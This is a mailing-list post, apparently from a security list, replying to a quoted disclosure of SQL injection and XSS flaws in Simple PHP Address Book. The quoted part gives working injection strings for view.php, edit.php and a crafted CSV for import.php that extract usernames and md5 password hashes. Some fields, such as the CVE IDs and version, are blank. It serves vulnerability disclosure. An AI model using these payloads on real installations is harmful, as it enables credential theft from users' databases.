As far as I know most of security vulnerabilities reported to this project haven't been fixed. Haven't verified this detail. What php-addressbook project would need is patches to fix all issues you can find. Finding vulnerabilities is easy - fixing in upstream is not. I can help you if you are willing to write patches. Takes hour or two :)  1:  --- Henri Salo  On Wed, Apr 17, at Doraemon Sk8ers wrote: > There is a SQL injection vulnerability and reflected XSS in Simple PHP > Address Book > The 2 vulnerabilities had been assigned the CVE identifier > (SQLi) & (XSS) respectively. >  > # Software Link: http://sourceforge.net/projects/php-addressbook/ > # Version: > # Tested on: > # CVE : (SQLi) & (XSS) >  >  > Details: > ----------- > * > * > (SQLi)* >  > We have discovered 3 pages which are prone to SQL Injection >  > 1.	/view.php?id=1 > The "id" parameter is vulnerable to SQL injection > Injection Vector: > 	/view.php?id=-1' union select username from > users limit 1),(select md5_pass from users limit 1),(select email from > users limit > This injection vector will dump the username, md5 password and email > of the first user in the user table onto the page itself >  > 2.	/edit.php > Most of the fields on this page are vulnerable to SQL injection > Injection Vector (inclusive of quotes): > 	'+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1), 1)))+' > This will dump out the ASCII value of the 1st character of the md5 > password of the first user >  > 3.	/import.php > The same injection vulnerability as Point 2 above is also present in > the import function > Using the same injection vector, saved in a csv file > 	'+(select ASCII(SUBSTRING((SELECT md5_pass from users limit 1), 1)))+' > Similarly, this injection vector will dump out the ASCII value of the > 1st character of the md5 password of the first user >  > The original input csv sample looks like this > "Last name";"First > name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail > home";"Work";"Fax";"E-mail office";"Second address";"Second phone" > > Country";"+1 > street, > secondcity, secondcountry";"+5 >  > The injected csv with the injected vectors looks like this > "Last name";"First > name";"Birthday";"Address";"ZIP";"City";"Home";"Mobile";"E-mail > home";"Work";"Fax";"E-mail office";"Second address";"Second phone" > ASCII(SUBSTRING((SELECT > md5_pass from users limit 1), 1)))+'";"";"city, Country";"+1 > > street, secondcity, > secondcountry";"+5 <snip>  Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
